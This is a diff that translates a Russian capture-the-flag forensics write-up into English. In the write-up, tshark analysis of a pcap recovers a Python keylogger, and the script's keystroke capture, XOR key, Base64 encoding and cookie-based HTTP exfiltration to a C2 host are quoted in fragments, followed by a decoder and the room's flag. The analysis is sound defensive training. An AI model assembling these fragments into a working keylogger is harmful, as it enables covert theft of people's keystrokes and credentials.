@@ -1,17 +1,18 @@
-**Теги**: PCAP Analysis, Forensic Network, Cryptography.
-**Сложность**: Easy.
+**Tags:** PCAP Analysis, Network Forensics, Cryptography.
 
-## 1. Анализ PCAP
+**Difficulty:** Easy.
 
-В этой комнате нам предоставлен файл `traffic.pcapng`. Наша задача — исследовать захваченный сетевой трафик и определить, что происходило внутри него.
+## 1. PCAP Analysis
 
-Первым делом посмотрим общую иерархию протоколов:
+In this room, we are provided with a `traffic.pcapng` file. Our task is to analyze the captured network traffic and determine what happened within it.
+
+First, we examine the overall protocol hierarchy:
 
 ```bash
 tshark -r traffic.pcapng -q -z io,phs
 ```
 
-Вывод:
+Output:
 
 ```text
 ===================================================================
@@ -32,7 +33,7 @@ eth                                      frames:1177 bytes:502017
         data-text-lines                  frames:30 bytes:27840
           tcp.segments                   frames:30 bytes:27840
       tls                                frames:228 bytes:133744
-        tcp.segments                     frames:21 bytes:17926
+        tcp.segments                   frames:21 bytes:17926
           tls                            frames:4 bytes:3444
     udp                                  frames:229 bytes:103822
       ssdp                               frames:32 bytes:12920
@@ -42,13 +43,13 @@ eth                                      frames:1177 bytes:502017
           quic                           frames:2 bytes:2584
 ```
 
-Особенно интересен HTTP-трафик. В PCAP присутствуют `62` HTTP-фрейма, поэтому дальше исследуем именно HTTP-запросы.
+HTTP traffic is particularly interesting. The PCAP contains `62` HTTP frames, so we investigate the HTTP requests further.
 
 ---
 
-## 2. Поиск HTTP-запросов
+## 2. Finding HTTP Requests
 
-Чтобы посмотреть, какие HTTP-ресурсы запрашивал клиент, используем:
+To see which HTTP resources were requested by the client, we use:
 
 ```bash
 tshark -r traffic.pcapng -Y http.request \
@@ -59,7 +60,7 @@ tshark -r traffic.pcapng -Y http.request \
 -e http.request.uri
 ```
 
-Получаем:
+We get:
 
 ```text
 192.168.1.141	34.41.103.191	byte-lotus-hotel.thm:8080	/temp/updates.py
@@ -69,43 +70,43 @@ tshark -r traffic.pcapng -Y http.request \
 ...
 ```
 
-Самый интересный запрос:
+The most interesting request is:
 
 ```text
 /temp/updates.py
 ```
 
-То есть клиент скачивает Python-файл с сервера `byte-lotus-hotel.thm:8080`.
+This means that the client downloads a Python file from the `byte-lotus-hotel.thm:8080` server.
 
 ---
 
-## 3. Восстановление содержимого TCP-потока
+## 3. Recovering the TCP Stream
 
-Теперь необходимо посмотреть содержимое TCP-соединения, в котором был передан `/temp/updates.py`.
+We now need to examine the contents of the TCP connection in which `/temp/updates.py` was transferred.
 
-Для этого используем:
+We use:
 
 ```bash
 tshark -r traffic.pcapng -q -z follow,tcp,ascii,5
 ```
 
-Команда показывает содержимое TCP stream №5 в ASCII-виде.
+This displays the contents of TCP stream #5 in ASCII format.
 
-В результате видим HTTP-запрос:
+The result contains the HTTP request:
 
 ```text
 GET /temp/updates.py HTTP/1.1
 Host: byte-lotus-hotel.thm:8080
 Connection: keep-alive
 Upgrade-Insecure-Requests: 1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
+User-Agent: Mozilla/5.0 (Windows NT 10.0; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
 Sec-GPC: 1
 Accept-Language: en-US,en;q=0.6
 Accept-Encoding: gzip, deflate
 ```
 
-Сервер отвечает:
+The server responds:
 
 ```text
 HTTP/1.0 200 OK
@@ -116,15 +117,15 @@ Content-Length: 1086
 Last-Modified: Wed, 17 Jun 2026 05:30:02 GMT
 ```
 
-Таким образом, сервер действительно отдаёт клиенту Python-скрипт `updates.py`.
+The server is therefore delivering a Python script named `updates.py` to the client.
 
 ---
 
-## 4. Анализ Python-скрипта
+## 4. Analyzing the Python Script
 
-В теле HTTP-ответа находится исходный код Python-программы.
+The HTTP response contains the source code of the Python program.
 
-Начало скрипта:
+The beginning of the script is:
 
 ```python
 import requests
@@ -134,15 +135,15 @@ from pynput import keyboard
 C2_URL = "http://byte-lotus-hotel.thm:8080/"
 ```
 
-Здесь сразу видны три важных момента:
+Three important details are immediately visible:
 
-* используется `pynput.keyboard` — библиотека для перехвата нажатий клавиш;
-* `requests` используется для отправки HTTP-запросов;
-* `C2_URL` указывает на сервер, куда программа передаёт полученные данные.
+* `pynput.keyboard` is used to capture keystrokes;
+* `requests` is used to send HTTP requests;
+* `C2_URL` specifies the server to which the collected data is sent.
 
-### Ключ шифрования
+### Encryption Key
 
-Далее находится функция:
+The following function defines the key:
 
 ```python
 def getkey():
@@ -151,49 +152,49 @@ def getkey():
     return p1 + p2
 ```
 
-Она объединяет две строки:
+It combines two strings:
 
 ```text
 H0t3lSt@ff0Nly
 K3epS3cr3t!
 ```
 
-Получившийся ключ:
+The resulting key is:
 
 ```text
 H0t3lSt@ff0NlyK3epS3cr3t!
 ```
 
-Этот ключ впоследствии используется для XOR-шифрования перехваченных символов.
+This key is later used for XOR encryption of the captured characters.
 
 ---
 
-## 5. Как работало шифрование
+## 5. How the Encryption Works
 
-Следующая функция реализует XOR:
+The following function implements XOR:
 
 ```python
 def xor(data: bytes, key: bytes) -> bytes:
     return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
 ```
 
-Для каждого байта входных данных выполняется XOR с соответствующим байтом ключа.
+Each byte of the input data is XORed with the corresponding byte of the key.
 
-Выражение:
+The expression:
 
 ```python
 key[i % len(key)]
 ```
 
-означает, что если данные длиннее ключа, ключ начинает использоваться повторно с первого байта.
+means that if the data is longer than the key, the key is reused from the beginning.
 
-В данном случае каждый символ вводимого текста сначала превращается в UTF-8 bytes, после чего XOR-ится с ключом.
+In this case, each input character is first converted to UTF-8 bytes and then XORed with the key.
 
 ---
 
-## 6. Как клавиши отправлялись на C2
+## 6. Sending Keystrokes to the C2 Server
 
-Функция `sendltr()` принимает один символ:
+The `sendltr()` function accepts a single character:
 
 ```python
 def sendltr(character):
@@ -201,18 +202,18 @@ def sendltr(character):
     encrypted = xor(raw_bytes, getkey().encode('utf-8'))
 ```
 
-То есть:
+So:
 
-1. символ превращается в байты;
-2. байты XOR-ятся с ключом.
+1. The character is converted into bytes.
+2. The bytes are XORed with the key.
 
-Затем результат кодируется Base64:
+The result is then encoded using Base64:
 
 ```python
 b64_string = base64.b64encode(encrypted).decode('utf-8')
 ```
 
-После этого создаётся HTTP-заголовок:
+An HTTP header is then created:
 
 ```python
 headers = {
@@ -221,25 +222,25 @@ headers = {
 }
 ```
 
-Таким образом, зашифрованный символ передаётся серверу не в теле POST-запроса, а внутри HTTP Cookie:
+Therefore, the encrypted character is not sent in the POST body, but inside an HTTP Cookie:
 
 ```text
 hotel_sess_state=<Base64>
 ```
 
-И затем выполняется GET-запрос:
+A GET request is then made:
 
 ```python
 requests.get(C2_URL, headers=headers, timeout=0.5)
 ```
 
-Следовательно, скрипт фактически реализует простой HTTP C2-канал: каждый нажатый символ отправляется серверу отдельным HTTP-запросом.
+The script therefore implements a simple HTTP C2 channel: each captured keystroke is sent to the server as a separate HTTP request.
 
 ---
 
-## 7. Перехват клавиатуры
+## 7. Keyboard Capture
 
-Функция:
+The following function handles key presses:
 
 ```python
 def on_press(key):
@@ -252,20 +253,18 @@ def on_press(key):
             sendltr("\n")
 ```
 
-обрабатывает нажатия клавиш.
-
-Для обычной клавиши вызывается:
+For a regular key, the following is called:
 
 ```python
 sendltr(key.char)
 ```
 
-Отдельно обрабатываются:
+The script separately handles:
 
 * `Space` → `" "`
 * `Enter` → `"\n"`
 
-Сам перехват запускается здесь:
+The keylogger starts here:
 
 ```python
 print("[*] Byte Lotus Sync Service started...")
@@ -273,15 +272,15 @@ with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
 ```
 
-Таким образом, программа постоянно ждёт нажатия клавиш и отправляет их на C2-сервер.
+The program continuously waits for keystrokes and sends them to the C2 server.
 
-По сути, мы обнаружили **keylogger**, который отправляет перехваченные клавиши через HTTP, предварительно применяя XOR и Base64.
+In other words, we have discovered a **keylogger** that sends captured keystrokes over HTTP after applying XOR encryption and Base64 encoding.
 
 ---
 
-# 8. Извлечение Cookie из PCAP
+# 8. Extracting Cookies from the PCAP
 
-Теперь, когда понятно, где именно передаются данные, извлекаем все HTTP Cookie из захваченного трафика:
+Now that we know where the data is transmitted, we extract all HTTP Cookies from the captured traffic:
 
 ```bash
 tshark -r traffic.pcapng -Y "http.cookie" \
@@ -289,7 +288,7 @@ tshark -r traffic.pcapng -Y "http.cookie" \
 -e http.cookie
 ```
 
-В результате получаем последовательность:
+The result is a sequence of values:
 
 ```text
 hotel_sess_state=HA==
@@ -324,29 +323,29 @@ hotel_sess_state=PQ==
 hotel_sess_state=NQ==
 ```
 
-Каждая строка соответствует одному отправленному символу.
+Each line corresponds to one transmitted character.
 
-Например:
+For example:
 
 ```text
 hotel_sess_state=HA==
 ```
 
-— это Base64-представление зашифрованного байта первого символа.
+is the Base64 representation of the encrypted byte of the first character.
 
-Важно, что нельзя просто объединить эти Base64-строки и один раз декодировать результат: каждая строка представляет **отдельный зашифрованный символ**, поэтому их нужно обрабатывать по отдельности.
+It is important that we cannot simply concatenate all of these Base64 strings and decode them once. Each string represents a **separate encrypted character**, so they must be processed individually.
 
 ---
 
-# 9. Написание декодера
+# 9. Writing a Decoder
 
-Создаём Python-скрипт:
+We create a Python script:
 
 ```bash
 nano decode.py
 ```
 
-В нём указываем тот же XOR-ключ, который был обнаружен в `updates.py`:
+We use the same XOR key discovered in `updates.py`:
 
 ```python
 import base64
@@ -354,7 +353,7 @@ import base64
 key = b"H0t3lSt@ff0NlyK3epS3cr3t!"
 ```
 
-Далее помещаем в переменную `data` все полученные из PCAP значения Base64:
+We then place all Base64 values extracted from the PCAP into the `data` variable:
 
 ```python
 data = """
@@ -391,13 +390,13 @@ NQ==
 """
 ```
 
-После этого каждую строку декодируем из Base64:
+Each line is then decoded from Base64:
 
 ```python
 encrypted = base64.b64decode(item.strip())
 ```
 
-Полученный байт расшифровываем тем же XOR-алгоритмом:
+The resulting byte is decrypted using the same XOR algorithm:
 
 ```python
 decoded = bytes(
@@ -406,13 +405,13 @@ decoded = bytes(
 )
 ```
 
-Расшифрованный символ добавляется к результирующей строке:
+The decrypted character is added to the resulting string:
 
 ```python
 result += decoded.decode()
 ```
 
-В конце выводим получившийся текст:
+Finally, we print the recovered text:
 
 ```python
 print(result)
@@ -420,38 +419,39 @@ print(result)
 
 ---
 
-# 10. Получение флага
+# 10. Obtaining the Flag
 
-Запускаем декодер:
+We run the decoder:
 
 ```bash
 python3 decode.py
 ```
 
-Получаем:
+The result is:
 
 ```text
 THM{V3r4_1s_w4tch1ng_0veR_y0u}
 ```
+
 ---
 
-## Как всё работало в целом
+## How It Worked
 
-В этой комнате атака/сбор данных выглядела следующим образом:
+The complete process can be summarized as follows:
 
 ```text
 traffic.pcapng
       │
       ▼
-HTTP-запрос
+HTTP request
 /temp/updates.py
       │
       ▼
 Python keylogger
       │
-      ├── перехватывает клавиши
+      ├── captures keystrokes
       │
-      ├── XOR с ключом
+      ├── XOR with key
       │
       ├── Base64
       │
@@ -463,19 +463,19 @@ hotel_sess_state=<Base64>
 PCAP
       │
       ▼
-tshark извлекает Cookie
+tshark extracts Cookies
       │
       ▼
 Base64 decode
       │
       ▼
-XOR с найденным ключом
+XOR with recovered key
       │
       ▼
-исходный текст
+original text
       │
       ▼
 THM{V3r4_1s_w4tch1ng_0veR_y0u}
 ```
 
-То есть **PCAP не содержал флаг в открытом виде**. Сначала из сетевого трафика мы восстановили вредоносный Python-скрипт, из него узнали алгоритм передачи и ключ XOR, затем извлекли отправленные Cookie и применили обратную операцию `Base64 → XOR`, после чего получили исходный текст и флаг.
+The **PCAP did not contain the flag in plain text**. We first recovered the malicious Python script from the network traffic, identified the transmission method and XOR key, then extracted the transmitted Cookies and applied the reverse `Base64 → XOR` process to recover the original text and the flag.
